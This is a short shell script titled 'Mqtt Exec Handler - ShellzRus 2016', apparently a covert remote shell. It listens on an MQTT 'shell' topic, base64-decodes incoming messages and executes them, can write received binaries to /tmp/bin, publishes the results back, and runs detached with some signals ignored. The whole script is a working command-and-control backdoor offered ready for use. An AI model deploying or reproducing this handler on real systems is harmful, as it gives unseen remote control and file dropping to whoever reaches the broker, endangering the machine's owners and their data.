# Mqtt Exec Handler - ShellzRus 2016
######################################################
# Usage: nohup ash mq &
#export PATH=/usr/sbin:/bin:/usr/bin:/sbin:/custom
run(){
host=localhost
pipe=p
binDest=/tmp/bin
if [ ! -p p ]; then
    mkfifo $pipe
fi
(subclient -h $host -t shell > $pipe) & # Daemonize
while read line <$pipe
do
  echo $line > enc
    base64 -d enc > denc;> enc
    if grep -q "_quit_" denc; then # Quit if we receive _quit_
        rm $pipe enc denc out
        break
    fi
# If the first line is _binary_, do not execute it,
    if grep -q "_binary_" denc; then
# but sed the line out an save it, than report exit status
      sed '1d' denc > $binDest
      if ([ $? -eq "0" ]);then 
        echo 'Successfully transfered binary :' > output 
        ls -l $binDest >> output
      else 
        echo 'Failed to write binary' > output
      fi
# publish status
      pubclient -h $host -t data -f output;>output
    else # otherwise execute whatever
      sh denc > output
      pubclient -h $host -t data -f output;>output
    fi
done
}

trap "" 1 2 8 #trap signals
(run) & 2>/dev/null # to detach, i think we need stder redirected
